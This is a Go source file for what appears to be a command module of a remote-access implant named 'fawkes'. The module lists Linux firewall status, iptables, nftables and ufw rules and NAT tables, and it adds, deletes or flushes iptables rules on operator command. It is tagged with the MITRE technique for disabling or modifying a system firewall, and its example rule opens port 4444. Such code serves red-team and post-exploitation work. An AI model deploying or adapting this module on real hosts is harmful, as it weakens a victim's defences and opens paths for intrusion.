//go:build linux

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strings"

	"fawkes/pkg/structs"
)

type IptablesCommand struct{}

func (c *IptablesCommand) Name() string        { return "iptables" }
func (c *IptablesCommand) Description() string { return "Linux firewall enumeration and rule management via iptables/nftables (T1562.004)" }

type iptablesArgs struct {
	Action string `json:"action"`
	Rule   string `json:"rule"`
	Table  string `json:"table"`
	Chain  string `json:"chain"`
}

func (c *IptablesCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Actions: status, rules, nat, add, delete, flush",
			Status:    "error",
			Completed: true,
		}
	}

	var args iptablesArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	switch strings.ToLower(args.Action) {
	case "status":
		return iptablesStatus()
	case "rules":
		return iptablesRules(args)
	case "nat":
		return iptablesNAT()
	case "add":
		return iptablesAdd(args)
	case "delete":
		return iptablesDelete(args)
	case "flush":
		return iptablesFlush(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: status, rules, nat, add, delete, flush", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func iptablesStatus() structs.CommandResult {
	var sb strings.Builder

	sb.WriteString("Linux Firewall Status\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	// IP forwarding
	sb.WriteString("IP Forwarding:\n")
	if v4, err := os.ReadFile("/proc/sys/net/ipv4/ip_forward"); err == nil {
		sb.WriteString(fmt.Sprintf("  IPv4: %s", strings.TrimSpace(string(v4))))
		if strings.TrimSpace(string(v4)) == "1" {
			sb.WriteString(" (enabled)")
		} else {
			sb.WriteString(" (disabled)")
		}
		sb.WriteString("\n")
	}
	if v6, err := os.ReadFile("/proc/sys/net/ipv6/conf/all/forwarding"); err == nil {
		sb.WriteString(fmt.Sprintf("  IPv6: %s", strings.TrimSpace(string(v6))))
		if strings.TrimSpace(string(v6)) == "1" {
			sb.WriteString(" (enabled)")
		} else {
			sb.WriteString(" (disabled)")
		}
		sb.WriteString("\n")
	}

	// iptables tables
	sb.WriteString("\niptables Tables:\n")
	if tables, err := os.ReadFile("/proc/net/ip_tables_names"); err == nil {
		for _, t := range strings.Split(strings.TrimSpace(string(tables)), "\n") {
			if t != "" {
				sb.WriteString(fmt.Sprintf("  - %s\n", t))
			}
		}
	} else {
		sb.WriteString("  (not available — iptables may not be loaded)\n")
	}

	// nftables check
	sb.WriteString("\nnftables:\n")
	if out, err := exec.Command("nft", "list", "tables").CombinedOutput(); err == nil {
		lines := strings.TrimSpace(string(out))
		if lines == "" {
			sb.WriteString("  (no tables)\n")
		} else {
			for _, line := range strings.Split(lines, "\n") {
				sb.WriteString(fmt.Sprintf("  - %s\n", line))
			}
		}
	} else {
		sb.WriteString("  (nft not available or permission denied)\n")
	}

	// ufw check
	sb.WriteString("\nufw:\n")
	if out, err := exec.Command("ufw", "status").CombinedOutput(); err == nil {
		for _, line := range strings.Split(strings.TrimSpace(string(out)), "\n") {
			sb.WriteString(fmt.Sprintf("  %s\n", line))
		}
	} else {
		sb.WriteString("  (ufw not available or permission denied)\n")
	}

	// Connection tracking
	sb.WriteString("\nConnection Tracking:\n")
	if count, err := os.ReadFile("/proc/sys/net/netfilter/nf_conntrack_count"); err == nil {
		sb.WriteString(fmt.Sprintf("  Active connections: %s\n", strings.TrimSpace(string(count))))
	}
	if max, err := os.ReadFile("/proc/sys/net/netfilter/nf_conntrack_max"); err == nil {
		sb.WriteString(fmt.Sprintf("  Max connections:    %s\n", strings.TrimSpace(string(max))))
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func iptablesRules(args iptablesArgs) structs.CommandResult {
	var sb strings.Builder

	table := args.Table
	if table == "" {
		table = "filter"
	}

	// Try iptables first
	sb.WriteString(fmt.Sprintf("iptables rules (table: %s)\n", table))
	sb.WriteString(strings.Repeat("=", 60) + "\n")

	iptArgs := []string{"-t", table, "-L", "-n", "-v", "--line-numbers"}
	if out, err := exec.Command("iptables", iptArgs...).CombinedOutput(); err == nil {
		sb.WriteString(string(out))
	} else {
		sb.WriteString(fmt.Sprintf("Error: %v\n%s\n", err, string(out)))
	}

	// Also try ip6tables
	sb.WriteString(fmt.Sprintf("\nip6tables rules (table: %s)\n", table))
	sb.WriteString(strings.Repeat("=", 60) + "\n")

	ip6Args := []string{"-t", table, "-L", "-n", "-v", "--line-numbers"}
	if out, err := exec.Command("ip6tables", ip6Args...).CombinedOutput(); err == nil {
		sb.WriteString(string(out))
	} else {
		sb.WriteString(fmt.Sprintf("Error: %v\n", err))
	}

	// Also show nftables if available
	if out, err := exec.Command("nft", "list", "ruleset").CombinedOutput(); err == nil {
		nftOut := strings.TrimSpace(string(out))
		if nftOut != "" {
			sb.WriteString("\nnftables ruleset\n")
			sb.WriteString(strings.Repeat("=", 60) + "\n")
			sb.WriteString(nftOut + "\n")
		}
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func iptablesNAT() structs.CommandResult {
	var sb strings.Builder

	sb.WriteString("NAT Rules\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n")

	if out, err := exec.Command("iptables", "-t", "nat", "-L", "-n", "-v", "--line-numbers").CombinedOutput(); err == nil {
		sb.WriteString(string(out))
	} else {
		sb.WriteString(fmt.Sprintf("iptables NAT error: %v\n%s\n", err, string(out)))
	}

	// nftables NAT
	if out, err := exec.Command("nft", "list", "table", "ip", "nat").CombinedOutput(); err == nil {
		nftOut := strings.TrimSpace(string(out))
		if nftOut != "" {
			sb.WriteString("\nnftables NAT\n")
			sb.WriteString(strings.Repeat("=", 60) + "\n")
			sb.WriteString(nftOut + "\n")
		}
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func iptablesAdd(args iptablesArgs) structs.CommandResult {
	if args.Rule == "" {
		return structs.CommandResult{
			Output: "Error: rule parameter required (e.g., '-A INPUT -p tcp --dport 4444 -j ACCEPT')",
			Status: "error", Completed: true,
		}
	}

	// Split rule into args
	parts := strings.Fields(args.Rule)
	cmdArgs := []string{}
	if args.Table != "" {
		cmdArgs = append(cmdArgs, "-t", args.Table)
	}
	cmdArgs = append(cmdArgs, parts...)

	out, err := exec.Command("iptables", cmdArgs...).CombinedOutput()
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error adding rule: %v\n%s", err, string(out)),
			Status: "error", Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Rule added: iptables %s\n%s", strings.Join(cmdArgs, " "), string(out)),
		Status:    "success",
		Completed: true,
	}
}

func iptablesDelete(args iptablesArgs) structs.CommandResult {
	if args.Rule == "" {
		return structs.CommandResult{
			Output: "Error: rule parameter required (e.g., '-D INPUT -p tcp --dport 4444 -j ACCEPT')",
			Status: "error", Completed: true,
		}
	}

	parts := strings.Fields(args.Rule)
	cmdArgs := []string{}
	if args.Table != "" {
		cmdArgs = append(cmdArgs, "-t", args.Table)
	}
	cmdArgs = append(cmdArgs, parts...)

	out, err := exec.Command("iptables", cmdArgs...).CombinedOutput()
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error deleting rule: %v\n%s", err, string(out)),
			Status: "error", Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Rule deleted: iptables %s\n%s", strings.Join(cmdArgs, " "), string(out)),
		Status:    "success",
		Completed: true,
	}
}

func iptablesFlush(args iptablesArgs) structs.CommandResult {
	chain := args.Chain

	cmdArgs := []string{}
	if args.Table != "" {
		cmdArgs = append(cmdArgs, "-t", args.Table)
	}
	cmdArgs = append(cmdArgs, "-F")
	if chain != "" {
		cmdArgs = append(cmdArgs, chain)
	}

	out, err := exec.Command("iptables", cmdArgs...).CombinedOutput()
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error flushing rules: %v\n%s", err, string(out)),
			Status: "error", Completed: true,
		}
	}

	target := "all chains"
	if chain != "" {
		target = chain
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Flushed %s: iptables %s\n%s", target, strings.Join(cmdArgs, " "), string(out)),
		Status:    "success",
		Completed: true,
	}
}
